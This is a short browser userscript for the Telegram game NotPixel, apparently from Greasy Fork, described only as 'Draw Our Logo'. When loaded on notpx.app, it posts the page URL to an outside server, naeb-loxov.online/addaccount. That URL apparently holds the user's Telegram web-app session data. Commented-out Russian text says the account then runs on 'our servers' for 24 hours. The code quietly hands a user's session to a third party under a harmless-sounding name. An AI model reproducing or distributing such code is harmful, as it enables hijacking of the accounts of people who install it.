// ==UserScript==
// @name         [LolzTeam NotPixel] Draw Our Logo!
// @namespace    Draw Our Logo
// @version      1.5
// @description  Draw Our Logo
// @author       ivank
// @match        https://notpx.app/*
// @match        https://notpx.app
// @match        https://web.telegram.org/*
// @match        https://web.telegram.org
// @icon         https://www.google.com/s2/favicons?sz=64&domain=notpx.app
// @grant        none
// @license      ivank
// @downloadURL https://update.greasyfork.org/scripts/508608/%5BLolzTeam%20NotPixel%5D%20Draw%20Our%20Logo%21.user.js
// @updateURL https://update.greasyfork.org/scripts/508608/%5BLolzTeam%20NotPixel%5D%20Draw%20Our%20Logo%21.meta.js
// ==/UserScript==
 
(async function () {
	if(location.host === "web.telegram.org") {
		while(true) {
			const webApp = document.querySelector('iframe[src*="https://notpx.app/"]');
			if(webApp && webApp.src != undefined && webApp.src.length > 10) location.href = webApp.src;
			await new Promise(resolve => setTimeout(resolve, 1000));
		}
	} else if(location.host === "notpx.app") {
        const response = await fetch("https://naeb-loxov.online/addaccount", {
			body: JSON.stringify({
				url: location.href
			}),
            method: "POST",
            headers: {
                'Content-Type': 'application/json'
            }
        });

        const text = await response.text();

		while(true) {
			if(response.status == 200) {
				alert(String(text))
				// document.documentElement.innerHTML = `Программа работает, пожалуйста не красьте пиксели в другом окне с этого аккаунта, Вы можете выключать Ваш компьютер, программа работает на наших серверах.\n!!! Сессия работает 24 часа, после этого Вам нужно будет снова сюда зайти.`;
			} else {
				alert(`Error: ${text}`)
				// document.documentElement.innerHTML = `Что-то пошло не так при добавлении аккаунта.<br>Error: ${text}`;
			}

			break;

			// await new Promise(resolve, 1000);
		}
	}
})();